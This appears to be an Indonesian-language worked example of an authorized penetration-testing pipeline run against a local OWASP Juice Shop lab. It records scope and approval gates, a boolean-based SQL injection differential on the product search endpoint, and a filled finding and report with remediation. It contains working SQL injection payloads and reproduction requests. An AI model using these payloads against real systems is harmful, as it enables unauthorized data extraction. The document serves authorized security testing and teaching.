# Worked Example — Mini Engagement: OWASP Juice Shop (boolean-based SQL Injection)

> Contoh nyata end-to-end pipeline Hermes Security Skills terhadap lab lokal
> yang ber-otorisasi (OWASP Juice Shop di Docker loopback). Dokumen ini adalah
> rekaman engagement yang BENAR-BENAR dijalankan: setup, scoping, approval,
> eksekusi via MCP + hermes-proxy, differential validation, finding, report
> draft, dan verifikasi gate keamanan. Mengikuti metodologi ROADMAP §8–§11,
> §22 (payload policy), §25 (evidence), §26 (finding lifecycle).
>
> Tanggal: 2026-09-13. Case: `juice-demo`. Semua traffic hanya ke
> `http://localhost:3000` (loopback, Docker lokal). Tidak ada host eksternal.

---

## 1. Lab Setup

```bash
docker pull bkimminich/juice-shop:latest
docker run -d --name juice-demo -p 127.0.0.1:3000:3000 bkimminich/juice-shop:latest
# tunggu ready: curl health sampai HTTP 200
curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/   # -> 200 (~5 detik)
```

- Image: `bkimminich/juice-shop:latest`, digest
  `sha256:73c53fbf442e8337b3ea3d98c7e8550308854701ebdfce4cc39768f36b75430e`.
- Docker server: 29.7.2. Banner aplikasi pada error page:
  `OWASP Juice Shop (Express ^4.22.1)`.
- Build toolchain (stdlib only, go 1.22):

```bash
export PATH="$TEMP/go/bin:$PATH"; export GOCACHE="$TEMP/gocache"; export GOPATH="$TEMP/gopath"
go build -o "$TEMP/hs.exe"  ./cmd/hermes-security
go build -o "$TEMP/hpx.exe" ./cmd/hermes-proxy
```

- hermes-proxy dijalankan sebagai control channel lokal (bukan container pada
  demo ini — pola yang sama dengan §11: policy in-line + fail-closed):

```bash
"$TEMP/hpx.exe" --addr 127.0.0.1:18080 \
  --bundle "$LAB/bundle.json" \
  --bundle-sha256 4c4912da5482704423eac5f35fed1399a41513ade33b0393cf746813c4c7091d \
  --evidence-dir "$LAB/evidence"
# log: policy in-line aktif — 1 host di-allowlist, budget 30 request,
#      rate 2 rps, redirect follow=true, timeout 15s
```

- MCP control plane (enforcement in-line: scope + risk + approval + abort):

```bash
"$TEMP/hs.exe" serve --mcp \
  --proxy-url http://127.0.0.1:18080 \
  --scope-file "$LAB/scope.yaml" \
  --state-dir  "$LAB/state" \
  --jobs-dir   "$LAB/jobs" \
  --evidence-dir "$LAB/evidence" \
  --audit-file "$LAB/audit.jsonl"
```

**Smoke test pra-engagement** (1 request `GET /rest/products/1` langsung ke
`POST /execute`, sebelum MCP aktif, untuk memastikan proxy sehat):
`HTTP 500`, evidence `evidence-000001.json`. Request ini DI LUAR approval MCP
dan dicatat eksplisit sebagai deviasi kecil (lihat §9). Budget proxy yang
dipakai: 1 dari 30.

---

## 2. Scoping dan Approval (ROADMAP §8/§9/§10)

### Scope file (`scope.yaml`)

```yaml
# Scope rules — case juice-demo (ROADMAP 8/9)
# Lab lokal ONLY: OWASP Juice Shop di Docker loopback.
allowed_hosts:
  - "localhost:3000"
```

### Policy bundle (`bundle.json`) + integrity hash

```json
{
  "version": 1,
  "allowed_hosts": ["localhost:3000"],
  "max_requests": 30,
  "rate_limit_rps": 2,
  "follow_redirects": true
}
```

- sha256 bundle: `4c4912da5482704423eac5f35fed1399a41513ade33b0393cf746813c4c7091d`
- Proxy menolak start tanpa `--bundle-sha256` yang match (fail-closed,
  terverifikasi saat startup di log).

### Approval store (`state/approvals.json`) — scoped approval §9

| id | case | capability | host | method | path | max | risk | expires | used (akhir) |
|---|---|---|---|---|---|---|---|---|---|
| `apr-juice-get-01` | juice-demo | request_replay | localhost | GET | * | 15 | medium | 2026-09-14T05:59:15Z | 15/15 |
| `apr-juice-post-01` | juice-demo | request_replay | localhost | POST | * | 15 | medium | 2026-09-14T05:59:15Z | 1/15 |
| `apr-juice-get-02` (renewal) | juice-demo | request_replay | localhost | GET | * | 2 | medium | 2026-09-14T06:07:xxZ | 1/2 |

Catatan renewal: budget GET approval pertama habis tepat saat pengujian butuh
satu request pembanding terakhir. Sesuai §9 (tidak ada silent extension),
renewal dibuat sebagai **record baru** `apr-juice-get-02` dengan budget
sempit (2), bukan penambahan angka pada record lama.

Risk `request_replay` = medium → policy action `conditional` → setiap call
wajib membawa `case: "juice-demo"` dan dicocokkan ke approval aktif
(method + host + path) sebelum budget dikonsumsi.

---

## 3. Fase 1 — Surface Mapping (pasif, 5 request GET)

Dijalankan via MCP `tools/call` → `request_replay` → hermes-proxy. Semua
request memakai `case=juice-demo`; approval GET terkonsumsi per request.

| # | Request | Status | Ringkasan baseline | Evidence |
|---|---|---|---|---|
| 1 | `GET /` | 200 | SPA homepage (serving `index.html`, `Content-Security-Policy` ada) | `evidence-000002.json` |
| 2 | `GET /rest/products/1` | 500 | **Anomali**: endpoint error tanpa parameter input — dicatat untuk fase berikutnya | `evidence-000003.json` |
| 3 | `GET /rest/user/whoami` | 200 | `{"user":{}}` — belum terautentikasi | `evidence-000004.json` |
| 4 | `GET /#/administration` | 200 | Fragment `#/administration` tidak pernah sampai server (routing SPA client-side); server melihat `GET /` | `evidence-000005.json` |
| 5 | `GET /api/Users/` | 401 | Auth terpasang; tapi body error page Express mengungkap pesan `UnauthorizedError: No Authorization header was found` | `evidence-000006.json` |

Observasi fase 1: permukaan REST terbuka (`/rest/*`) + API generik (`/api/*`)
dengan JWT guard; error page HTML Express bocor pada beberapa endpoint
(500/401) — kandidat CWE-209.

---

## 4. Fase 2 — Hypothesis dan Validation (SQL Injection pada search)

### Hypothesis (ditulis SEBELUM eksekusi, format §26)

> `GET /rest/products/search?q=<input>` pada Juice Shop membangun query SQL
> dengan mengkonkatenasi parameter `q` langsung ke raw SQL (bukan
> parameterized). Konsekuensinya: (a) input boolean SQL mengubah hasil
> response; (b) input yang merusak sintaks memicu kebocoran error SQL ke
> client.

Baseline dipilih `q=smartphone` (kueri normal, tidak ada produk bernama
"smartphone" di katalog → jawaban kosong yang deterministik):
`200`, body `{"status":"success","data":[]}` — 30 byte, 0 item.

### Hasil eksekusi (semua via MCP request_replay)

| # | Payload (`q=`) | Status | Hasil | Evidence | sha256 |
|---|---|---|---|---|---|
| 1 | `smartphone` (baseline) | 200 | 0 item (30 B) | `evidence-000007.json` | `b7aecacd0d8ff2976984959cae69ba7d13a06eb98534b0ef4812a20f7f2dfdf7` |
| 2 | `'--` | 500 | **Error disclosure**: `Error: SQLITE_ERROR: incomplete input` + banner `OWASP Juice Shop (Express ^4.22.1)` (942 B HTML) | `evidence-000008.json` | `e87e5531f083245f8bc55f05526a0d81f4dedbfa0b793d121682a57de232c393` |
| 3 | `' OR 1=1--` | 500 | sama: `SQLITE_ERROR: incomplete input` | `evidence-000009.json` | `73ea284b232d5e0b8501303ffdba9cfd15a8fb747dcdd92a96e78ce464a053e0` |
| 4 | `'` | 200 | 0 item — quote tunggal saja tidak mengubah hasil | `evidence-000010.json` | `0e5db8fe1649f123f19e8b4b9fb867318f5817d6a52cf5720dd4b403f37db08f` |
| 5 | `' OR 1=1 OR title LIKE '` | 500 | **Error disclosure (schema)**: `Error: SQLITE_ERROR: no such column: title` — input diparse sebagai identifier SQL | `evidence-000011.json` | `d9078d9460ea8c820acd95f79f50cd38198d6af6c6903ed5ee752dcdb7dbe4d4` |
| 6 | `' OR 1=1 OR name LIKE '` | 200 | **46 item** — seluruh katalog terekstrak | `evidence-000013.json` | `1c09623700f9be888ac7001b7fb428bc4d54d663b4456f8b5a04a944562b3309` |
| 7 | `' OR 1=2 OR name LIKE '` | 200 | 46 item — kontrol ini BOCOR (trailing `LIKE '%'` selalu match); dipertahankan sebagai pembelajaran | `evidence-000014.json` | `9af7c6965deb2c4301ddaf87016327a35723047e24f09fc764cb12ee34c42299` |
| 8 | `' AND 1=2 AND name LIKE '` | 200 | **0 item** — kontrol FALSE | `evidence-000015.json` | `ad37a4629fc32df027efb177697e6060f916cf88bfe28f9d3bae57f9a7dd1d3d` |
| 9 | `%` (wildcard, bukan injection) | 200 | 46 item — kontrol perilaku LIKE wildcard endpoint | `evidence-000016.json` | `4dbb6e69879e11e9cbe18ef75f3f8ac7a60bbf423e733578c4f59635277cd669` |
| 10 | `' AND 1=1 AND name LIKE '` | 200 | **46 item** — arm TRUE | `evidence-000018.json` | `0ed73755fe18b6de08a697735197168588f68fc4b7d9e3d45bb45dbede3f1f93` |

**Catatan kejujuran (versi terbaru Juice Shop):** payload klasik `q='--` TIDAK
lagi mengembalikan daftar produk (termasuk produk terhapus) seperti versi lama
— sekarang memicu `500 SQLITE_ERROR: incomplete input`. Temuan utama
digeser ke differential **boolean-based** yang lebih kuat secara metodologi.

### Differential utama (pasangan kontrol A/B yang beda HANYA di boolean literal)

```
q=' AND 1=1 AND name LIKE '   -> 200, 46 item, 16563 byte  (evidence-000018)
q=' AND 1=2 AND name LIKE '   -> 200,  0 item,    30 byte  (evidence-000015)
```

Satu-satunya perbedaan request adalah literal boolean `1=1` vs `1=2` — hasil
berubah dari seluruh katalog (46 produk: "Apple Juice (1000ml)",
"Apple Pomace", ..., "Woodruff Syrup \"Forest Master X-Treme\"") menjadi kosong.
Ini membuktikan input dieksekusi sebagai logika SQL (CWE-89), dan bukan efek
wildcard/caching (kontrol #9 menunjukkan `%` memang mengembalikan 46 item,
tetapi `1=2` menekan hasil ke 0 — perilaku yang mustahil terjadi tanpa
eksekusi boolean).

Error disclosure terpisah (CWE-209): `q='--` → halaman 500 berisi
`Error: SQLITE_ERROR: incomplete input`; `q=' OR 1=1 OR title LIKE '` →
`no such column: title` (kebocoran proses enumerasi kolom).

### Tool read-only MCP untuk analisis (tanpa traffic ke target)

`response_comparison` dipanggil 4 kali dari event store:

- `evidence-000007` vs `evidence-000013`: `body_diff 30 B -> 16563 B`
- `evidence-000013` vs `evidence-000015`: `body_diff 16563 B -> 30 B`
- `evidence-000018` vs `evidence-000015`: `body_diff 16563 B -> 30 B`
  (pasangan boolean bersih)
- `evidence-000007` vs `evidence-000008`: `status_diff 200 -> 500`,
  `content-type application/json -> text/html`

`list_history` memverifikasi 16 entri tercatat konsisten dengan approval.

### 1 request POST (jalur approval POST)

`POST /rest/user/login` dengan kredensial test yang jelas invalid
(`engagement-path-check@example.invalid`) — SATU percobaan, bukan list/brute
force, tujuannya memverifikasi jalur approval POST + budget terpisah:
hasil `401`, evidence `evidence-000017.json`
(sha256 `2fc58f2d32639f0baca163ef9f98b120da1aea64ace3cafe37e6c00fdd4af516`).

---

## 5. Fase 3 — Finding (template `templates/finding-template.md`, diisi)

```markdown
# Finding FND-0001: Boolean-based SQL Injection + SQL Error Disclosure pada
  GET /rest/products/search (parameter q)

## Metadata

- finding_id: FND-0001
- case_id: juice-demo
- state: reproduced
- severity_provisional: high
- novelty_classification: known-common-pattern
- date_opened: 2026-09-13
- date_updated: 2026-09-13

## Hypothesis

Parameter `q` pada `GET /rest/products/search` dikonkatenasi langsung ke raw
SQL query (bukan parameterized), sehingga input yang dikendalikan penyerang
dieksekusi sebagai logika SQL dan error SQL dapat bocor ke response.

## Baseline Evidence

- baseline_evidence_ref: evidence-000007.json
  (sha256 b7aecacd0d8ff2976984959cae69ba7d13a06eb98534b0ef4812a20f7f2dfdf7 —
  q=smartphone -> 200, {"status":"success","data":[]}, 30 byte)
- baseline pendukung: evidence-000010.json (q=' -> 200, 0 item — quote
  tunggal tanpa SQL term tidak mengubah hasil)

## Reproduction Steps

1. Target siap: Juice Shop lokal `http://localhost:3000` (docker), tanpa
   autentikasi.
2. Kirim `GET /rest/products/search?q=%27%20AND%201%3D1%20AND%20name%20LIKE%20%27`
   → 200 dengan 46 item katalog penuh (16563 byte) — evidence-000018.json.
3. Kirim `GET /rest/products/search?q=%27%20AND%201%3D2%20AND%20name%20LIKE%20%27`
   → 200 dengan 0 item (30 byte) — evidence-000015.json.
4. Bandingkan: satu-satunya perbedaan request adalah `1=1` vs `1=2`; hasil
   berubah 46 -> 0 item. (Opsional: `q=%25` -> 46 item sebagai kontrol
   wildcard — evidence-000016.json.)
5. Kirim `GET /rest/products/search?q=%27--` → 500 dengan pesan
   `Error: SQLITE_ERROR: incomplete input` pada halaman HTML —
   evidence-000008.json. Ulangi dengan `q=%27%20OR%201%3D1%20OR%20title%20LIKE%20%27`
   → `no such column: title` — evidence-000011.json.

## Expected vs Actual

- expected_behavior: parameter `q` di-bind sebagai nilai (prepared
  statement/ORM). Boolean SQL literal diperlakukan sebagai string pencarian
  literal; response tidak berubah karena `1=1`/`1=2`; error internal tidak
  pernah dikirim ke client (generic 500 + logging internal).
- actual_behavior: `1=1` mengembalikan seluruh katalog (46 item),
  `1=2` mengembalikan 0 item (differential 16563 B vs 30 B). Input yang
  merusak sintaks menghasilkan halaman 500 HTML berisi `SQLITE_ERROR` dan
  banner `OWASP Juice Shop (Express ^4.22.1)`; identifier salah pada payload
  menghasilkan `no such column: title` (mengungkap skema).

## Impact

Penyerang tanpa autentikasi dapat mengekstrak seluruh isi tabel Products
dalam satu request (termasuk kolom yang tidak diekspor UI normal), dan
menggunakan error disclosure untuk memetakan skema/teknologi database sebagai
batu loncatan ekstraksi lanjutan (mis. tabel user melalui UNION/error-based).
Pada deployment nyata, pola yang sama pada query lain dapat mengekspos data
pengguna.

## False Positive Analysis

- Aplikasi lab yang SENGAJA vulnerable: OWASP Juice Shop memang berisi
  SQLi terkenal dan dipublikasikan; temuan ini adalah instance dari pola yang
  sudah diketahui publik, bukan zero-day — klasifikasi novelty
  `known-common-pattern`, state dihentikan di `reproduced` (bukan
  `confirmed`) karena verifikasi source-code tidak dijalankan dalam engagement
  mini ini.
- Wildcard semantics: `q=%` juga mengembalikan 46 item — dikesampingkan
  sebagai penyebab karena kontrol FALSE `1=2` menekan hasil ke 0 item;
  perilaku wildcard murni tidak menjelaskan differential boolean.
- Cache/proxy artefak: kedua arm dieksekusi berurutan lewat hermes-proxy yang
  tidak melakukan caching; `Date`/`etag` berbeda per request
  (response_comparison), body konsisten per arm.
- Environment: docker image resmi bkimminich/juice-shop:latest
  (digest 73c53fbf...) di loopback lokal; tidak ada WAF/CDN yang bisa
  memanipulasi hasil.

## Scope Reference

- scope_ref: scope.yaml `{allowed_hosts: ["localhost:3000"]}` + approval
  `apr-juice-get-01`/`apr-juice-get-02` (GET) pada case `juice-demo` (§9).
  Semua request berada di dalam scope; 1 percobaan out-of-scope
  (evil.tld) DITOLAK dan tidak dieksekusi.

## Confidence

- confidence: 0.95 — differential boolean bersih (satu variabel), direproduksi
  pada dua pasangan payload (OR-form dan AND-form), ditambah disclosure error
  SQL yang konsisten; dikurangi sedikit karena verifikasi source-code belum
  dijalankan di engagement ini.

## Sanitized Artifacts

- evidence proxy (headers di-redaksi proxy, body base64, masing-masing
  di-hash saat dibuat, §25): `$TEMP/hs-lab/evidence/evidence-0000{07,08,10,11,13,15,16,18}.json`
- hash lengkap tercantum di tabel Fase 2 dan audit `audit.jsonl`
  (hash-chained). Data target dihapus saat cleanup sesuai retention §25;
  dokumen ini menyimpan hash + potongan non-sensitif sebagai rekaman permanen.

## State History

- 2026-09-13 — observation — baseline q=smartphone (0 item) vs payload `'--`
  menghasilkan 500 SQLITE_ERROR: disclosure (evidence-000007/000008).
- 2026-09-13 — hypothesis — input `q` dieksekusi sebagai SQL; uji boolean
  differential dirancang (TRUE/FALSE control).
- 2026-09-13 — needs-validation — payload pertama `OR 1=2 OR name LIKE '`
  bocor (46 item): kontrol diperbaiki ke bentuk AND (evidence-000014/000015).
- 2026-09-13 — reproduced — pasangan bersih `AND 1=1` (46 item,
  evidence-000018) vs `AND 1=2` (0 item, evidence-000015) + error disclosure
  reproducible (evidence-000008/000011). State dihentikan di `reproduced`
  (FP: dataset demo sengaja vulnerable; verifikasi source belum dijalankan).
```

---

## 6. Report Draft (template `templates/report-template.md`, diisi)

> Status tetap `draft` — pengiriman otomatis ke vendor/program adalah non-goal
> (ROADMAP §2); submission butuh human approval terpisah.

```markdown
# SQL Injection pada endpoint pencarian produk OWASP Juice Shop
  (GET /rest/products/search)

## Header

- Report ID: RPT-0001
- Title: Boolean-based SQL Injection + SQL Error Disclosure pada parameter
  `q` endpoint `GET /rest/products/search`
- Severity: high
- Status: draft
- Date: 2026-09-13
- Finding Ref: FND-0001
- Case Ref: juice-demo

## Summary

Endpoint pencarian produk membangun query SQL dengan mengkonkatenasi parameter
`q` tanpa parameterization. Dua request yang hanya berbeda pada literal
boolean (`1=1` vs `1=2`) mengembalikan 46 item (seluruh katalog, 16563 byte)
versus 0 item (30 byte) — bukti eksekusi logika SQL yang dikendalikan
penyerang. Input yang merusak sintaks juga mengembalikan halaman 500 berisi
pesan `SQLITE_ERROR` (error disclosure). Temuan berstatus reproduced
(evidence-based, differential A/B), belum confirmed ke source code.

## Affected Scope

- `http://localhost:3000/rest/products/search` (parameter `q`, method GET,
  tanpa autentikasi)
- scope_ref: scope.yaml allowed_hosts ["localhost:3000"]; approval
  apr-juice-get-01 / apr-juice-get-02 (case juice-demo)

## Reproduction Steps

1. Jalankan target lab (dari image resmi bkimminich/juice-shop:latest).
2. `GET /rest/products/search?q=%27%20AND%201%3D1%20AND%20name%20LIKE%20%27`
   → 200, 46 item katalog penuh.
3. `GET /rest/products/search?q=%27%20AND%201%3D2%20AND%20name%20LIKE%20%27`
   → 200, 0 item. Bandingkan dengan langkah 2: hanya `1=1` vs `1=2`.
4. (Disclosure) `GET /rest/products/search?q=%27--` → 500
   `Error: SQLITE_ERROR: incomplete input`.

## Evidence References

- evidence-000007.json — baseline `q=smartphone`: 200, `data:[]` (30 byte)
- evidence-000018.json — arm TRUE `AND 1=1`: 200, 46 item (16563 byte)
- evidence-000015.json — arm FALSE `AND 1=2`: 200, 0 item (30 byte)
- evidence-000016.json — kontrol wildcard `q=%`: 200, 46 item (bukan
  injection)
- evidence-000008.json / evidence-000011.json — error disclosure
  `SQLITE_ERROR: incomplete input` / `no such column: title` (500)
- Semua evidence di-hash sha256 saat dibuat oleh hermes-proxy (hash di tabel
  §4 dokumen engagement).

## Impact

Katalog produk penuh terekstrak oleh penyerang anonim dalam satu request;
error disclosure membuka jalur enumerasi skema untuk ekstraksi data lebih
dalam. Pada deployment nyata pola identik pada query lain berpotensi
mengekspos data pengguna (PII/kredensial hash).

## Remediation

1. Ganti konkatenasi string dengan prepared statement / binding parameter
   (`LIKE :pattern` dengan pattern dihitung di kode) — perbaikan utama.
2. Pastikan lapisan akses data tidak mengizinkan raw query dengan input
   string; tambahkan code review/lint untuk `sequelize.query`/raw SQL.
3. Matikan debug error page ke klien: kirim generic 500 + error ID;
   detail SQL hanya di log internal (menutup CWE-209).
4. Verifikasi perbaikan: ulangi keempat request di Reproduction Steps —
   boolean tidak boleh mengubah hasil (keduanya menghasilkan 0 item untuk
   string tak dikenal) dan 500 tidak lagi memuat pesan SQL.

## References

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- CWE-209: Generation of Error Message Containing Sensitive Information
- OWASP Top 10 2021 — A03:2021 Injection
- OWASP Juice Shop (sumber resmi, app demo yang memang berisi kerentanan
  pelatihan)
```

---

## 7. Verifikasi Gate Keamanan (enforcement tetap aktif saat engagement)

| Gate | Uji | Hasil |
|---|---|---|
| Scope (§8) | `tools/call request_replay` ke `http://evil.tld/` dengan case `juice-demo` | **DENIED in-line**: `scope: host di luar scope: evil.tld` — request tidak pernah sampai proxy/provider, tidak ada egress. Ter-audit (decision `denied`). |
| Budget approval (§9) | `apr-juice-get-01` GET max 15 | `used` bertambah per request hingga **15/15**; request GET berikutnya ditolak: `tidak ada scoped approval aktif ... — minta approval baru dari user, TIDAK ada silent renewal` (ter-audit). Renewal dilakukan sebagai record baru `apr-juice-get-02` (max 2). |
| Budget proxy (§11) | bundle `max_requests: 30` | 18 request dieksekusi (17 GET + 1 POST); 12 slot sisa. Tidak ada penolakan `budget_habis`. |
| Rate limit (§22) | token bucket 2 rps | Tidak terkena: 0 penolakan rate_limit. Jeda antar-request ~0.65 s (token refill 2/detik, burst 2) — kondisi stop `stop_on_429` tidak terpicu. |
| Kill switch (§10) | tidak diuji aktif | `--jobs-dir` terpasang; marker abort dicek per call oleh MCP (jalur tersedia, tidak dipicu karena tidak ada abort). |
| Destructive (§2/§22) | seluruh payload | 0 payload destruktif; 1 POST bersifat read-only efeknya (login gagal 401). |

---

## 8. Metrik Engagement

| Metrik | Nilai |
|---|---|
| Request ke target (via MCP + proxy) | 17 (16 GET + 1 POST) |
| Request pra-engagement (smoke test, luar approval) | 1 |
| Budget proxy terpakai | 18 / 30 |
| Budget approval GET-01 | 15 / 15 (habis, renewal ke GET-02) |
| Budget approval GET-02 (renewal) | 1 / 2 |
| Budget approval POST | 1 / 15 |
| Scope violation yang dieksekusi | **0** (1 percobaan evil.tld → ditolak) |
| Request ditolak rate limit | 0 |
| Payload destruktif | 0 |
| Evidence file (sha256'd, headers redacted) | 18 (`evidence-000001..000018.json`) |
| Audit entries (JSONL, hash-chained) | 31 |
| Vektor diuji | 10 (baseline, 3 error-classic, schema probe, 3 boolean, wildcard, POST path-check) |
| Temuan | 1 finding `reproduced` (FND-0001, high) + 1 report draft (RPT-0001) |

---

## 9. Deviasi dan Catatan Jujur

1. **Payload klasik `q='--` tidak lagi mengembalikan daftar produk** pada
   image terbaru (2026-09): hasilnya 500 `SQLITE_ERROR: incomplete input`,
   bukan daftar produk termasuk yang terhapus. Sesuai protokol, diverter ke
   temuan alternatif berbasis differential yang lebih kuat (boolean-based
   A/B) + error disclosure — keduanya terdokumentasi dengan evidence nyata.
2. **Baseline `q=smartphone` mengembalikan 0 item** karena katalog tidak
   memiliki produk bernama "smartphone" — dipakai sebagai baseline kosong
   deterministik, bukan asumsi.
3. **Kontrol boolean pertama bocor** (`' OR 1=2 OR name LIKE '` → 46 item,
   evidence-000014) karena trailing `LIKE '%'` selalu match; diperbaiki
   dengan bentuk `AND ... AND` dan kontrol wildcard. Riwayat dikoreksi
   terbuka di State History (prinsip append-only, bukan perbaikan diam-diam).
4. **1 smoke test pra-engagement** dilakukan langsung ke `POST /execute`
   (tanpa approval MCP) murni untuk memastikan proxy sehat; dicatat eksplisit
   dan dihitung terpisah dari metrik engagement.
5. **`GET /#/administration` tidak pernah menguji route admin server-side** —
   fragment tidak dikirim ke server (server melihat `GET /`). Ini limitasi
   black-box HTTP; pengujian UI admin butuh browser.
6. **Evidence di-retensi lalu dihapus** sesuai §25 retention (case data tidak
   persist tanpa batas); dokumen ini menyimpan sha256 semua evidence + kutipan
   non-sensitif sebagai rekaman permanen. Tidak ada credential/session token
   nyata dalam engagement ini.
7. **State finding sengaja dihentikan di `reproduced`**, tidak dinaikkan ke
   `confirmed`: Juice Shop memang app pelatihan yang sengaja vulnerable
   (FP analysis menutup alternatif lain), tetapi verifikasi source-code
   (langkah `confirmed`) tidak dijalankan dalam engagement mini ini.
